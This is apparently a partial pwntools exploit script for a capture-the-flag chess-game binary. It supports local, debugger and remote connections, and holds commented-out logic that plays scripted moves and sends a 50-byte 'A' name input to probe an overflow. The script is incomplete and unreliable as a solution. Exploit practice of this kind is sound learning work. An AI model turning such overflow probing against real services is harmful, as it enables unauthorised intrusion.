from pwn import *

def con(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	elif args.GDB:
		return gdb.debug(exe, gdbscript='''
            b *0x0000000000401211
			c
			''')
	else:
		return process(exe)


exe = './main'
io = con()
elf = context.binary = ELF(exe, checksec = False)

context.log_level = 'info'

#---------------------------------------------------------------------
start = p32(0x5)
end = p32(0x0)
'''
moves = [
    'e2 e4',
    'e7 e5',
    'd1 h5',
    'g7 g6',
    'h5 e5',
    'b8 c6',
    'f1 c4',
    'd8 e7',
    'e5 e6',
    'e7 d6'
]

for move in moves:
    io.recvuntil(b'Input : ')
    io.sendline(move)


io.recvuntil(b'Input : ')
io.sendline(b'e7 d6')
io.recvuntil(b'your name? : ')
io.sendline(b'A'*50)
io.recvuntil(b'continue?')
io.sendline(b'Y')


for i in range(20):
    io.recvuntil(b'Input : ')
    io.sendline(b'e7 d6')
    io.recvuntil(b'Input : ')
    io.sendline(b'e7 d6')
    io.recvuntil(b'Input : ')
    io.sendline(b'e7 d6')
    io.recvuntil(b'your name? : ')
    io.sendline(b'A'*50)
    io.recvuntil(b'continue?')
    io.sendline(b'Y')
'''
#--------------------------------------------------------------------
io.interactive()



